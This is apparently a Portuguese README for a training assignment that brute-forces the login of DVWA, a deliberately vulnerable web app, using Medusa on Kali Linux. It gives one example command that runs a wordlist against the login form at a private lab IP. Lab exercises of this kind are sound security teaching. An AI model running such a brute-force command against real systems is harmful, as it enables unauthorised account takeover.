# 🔐 Brute Force Attack com Medusa — Kali Linux

Projeto completo para entrega do desafio de criação de ataque de força bruta usando Medusa, DVWA e Kali Linux.

## 📁 Estrutura
- `/wordlists` — lista de senhas
- `/scripts` — script automatizado
- `/configs` — scan Nmap
- `/images` — capturas de tela

## 📘 Documentações
- Kali Linux: https://www.kali.org
- DVWA: https://github.com/digininja/DVWA
- Medusa: http://foofus.net/goons/jmk/medusa/medusa.html
- Nmap: https://nmap.org/book/

## 🧪 Execução (exemplo)
```
medusa -h 192.168.1.10 -u admin -P wordlists/wordlist.txt -M http -m DIR:/dvwa/login.php FORM:username=^USER^&password=^PASS^ -T 5
```

## 📌 Imagens incluídas
As imagens abaixo são apenas ilustrativas para completar o repositório:
- nmap-scan.png
- dvwa-login.png
- medusa-attack.png
